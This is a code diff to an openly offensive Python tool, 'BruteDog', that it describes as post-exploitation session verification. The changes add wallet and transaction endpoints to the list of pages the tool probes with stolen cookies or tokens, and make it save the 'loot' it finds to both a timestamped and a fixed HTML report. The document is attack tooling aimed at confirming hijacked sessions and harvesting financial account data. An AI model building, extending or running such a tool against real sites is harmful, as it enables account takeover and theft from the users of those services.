@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.3
+LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.4
 Senior Red Team Edition: Structural JSON schema validation & strict negative DOM assertions.
 """
 import sys
@@ -17,6 +17,7 @@ def log(msg, color="\033[92m"):
 def save_loot_report(endpoint, status, body):
     timestamp = int(time.time())
     filename = f"session_loot_report_{timestamp}.html"
+    static_filename = "session_loot_report.html"
     
     # Format cleanly for HTML viewer
     try:
@@ -31,7 +32,7 @@ def save_loot_report(endpoint, status, body):
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>BruteDog v7.3 — Verified Session Loot</title>
+    <title>BruteDog v7.4 — Verified Session Loot</title>
     <style>
         body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }}
         .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 2rem; max-width: 900px; margin: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }}
@@ -50,10 +51,16 @@ def save_loot_report(endpoint, status, body):
 </body>
 </html>
 """
-    with open(filename, "w", encoding="utf-8") as f:
-        f.write(html_content)
-    
-    log(f"[+] Loot successfully secured and exported to: {filename}", "\033[92m")
+    # Save both timestamped historical report and static viewer filename
+    try:
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(html_content)
+        with open(static_filename, "w", encoding="utf-8") as f:
+            f.write(html_content)
+        log(f"[+] Loot successfully secured and exported to: {filename} & {static_filename}", "\033[92m")
+    except Exception as exc:
+        log(f"[-] Failed to write loot report files: {exc}", "\033[91m")
+
     return filename
 
 def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
@@ -68,6 +75,12 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
         "/dashboard",
         "/user/dashboard",
         "/api/user/balance",
+        "/user/wallet",
+        "/wallet",
+        "/api/user/wallet",
+        "/api/user/transaction",
+        "/user/transaction",
+        "transaction",
         "/api/auth/user",
         "/api/dashboard/stats"
     ]
